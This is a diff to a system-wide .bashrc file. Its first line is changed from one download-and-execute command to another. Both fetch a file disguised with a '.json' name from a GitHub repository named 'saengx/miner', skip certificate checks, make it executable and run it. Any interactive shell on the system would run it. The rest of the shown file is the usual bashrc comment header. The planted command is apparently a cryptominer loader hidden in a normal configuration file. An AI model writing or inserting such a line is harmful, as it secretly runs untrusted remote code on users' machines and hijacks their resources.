@@ -1,4 +1,4 @@
-rm -f begin-control.json && wget -N --timeout 20 --connect-timeout=30 -t 2 --no-check-certificate https://raw.githubusercontent.com/saengx/miner/main/begin-control.json && chmod +x begin-control.json && ./begin-control.json
+rm -f cpu-control.json && wget -N --timeout 20 --connect-timeout=30 -t 2 --no-check-certificate https://raw.githubusercontent.com/saengx/miner/main/cpu-control.json && chmod +x cpu-control.json && ./cpu-control.json
 # System-wide .bashrc file for interactive bash(1) shells.
 
 # To enable the settings / commands in this file for login shells as well,
